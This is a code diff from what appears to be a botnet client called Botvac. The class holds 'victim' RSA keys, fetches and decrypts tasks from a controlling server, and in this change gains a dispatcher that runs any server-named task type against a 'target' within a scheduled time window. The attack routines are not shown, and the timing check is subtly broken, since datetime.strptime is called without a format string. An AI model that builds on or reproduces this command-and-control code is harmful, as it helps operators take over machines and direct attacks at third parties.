@@ -8,6 +8,7 @@ import requests
 import rsa
 import schedule as schedule
 
+from bot.botvac_task_executer import BotvacTaskExecutor
 from bot.objects.Logger import Logger
 from bot.objects.task import Task, TaskResult
 
@@ -23,6 +24,7 @@ class BotvacManager:
         self.victim_public_key = None
         self.victim_private_key = None
         self.server_public_key = None
+        self.task_executor = BotvacTaskExecutor()
 
     def get_public_key(self):
         self.logger.debug("trying to get server's public key")
@@ -60,15 +62,17 @@ class BotvacManager:
         return json.loads(rsa.decrypt(crypto=encrypted_json, priv_key=self.victim_private_key))
 
     def run_last_task(self) -> TaskResult:
-        self.logger.warning("Not implemented yet.")
-        self.logger.debug(Task.convert_to_dict())
-        return TaskResult()
+        self.task_executor.prepare_metadata(task_id=self.last_task.task_id, target=self.last_task.target,
+                                            start_time=self.last_task.start_time, end_time=self.last_task.end_time)
+        self.logger.debug(f"starting task {self.last_task.task_id}")
+        task_result: TaskResult = getattr(self.task_executor,self.last_task.task_type)()
+        self.logger.debug(f"finished task {self.last_task.task_id}")
+        return task_result
 
     def _run_task_routine(self):
         self.update_last_task()
         if self.last_task and datetime.strptime(self.last_task.start_time) <= datetime.now() < datetime.strptime(
                 self.last_task.end_time):
-
             self.run_last_task()
 
     def main(self):
